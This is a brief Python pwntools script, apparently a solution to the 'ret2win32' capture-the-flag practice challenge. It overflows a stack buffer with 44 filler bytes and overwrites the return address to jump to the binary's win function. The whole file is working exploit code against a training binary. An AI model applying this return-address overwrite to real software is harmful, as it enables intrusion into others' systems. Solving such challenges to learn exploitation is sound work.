from pwn import *
import sys

buf = ""
buf += "A"*44
buf += "\x59\x86\x04\x08" #0x8048659 ret2win()

b = process("./ret2win32")
b.recv()
b.sendline(buf)
sys.stdout.write(b.recvall())
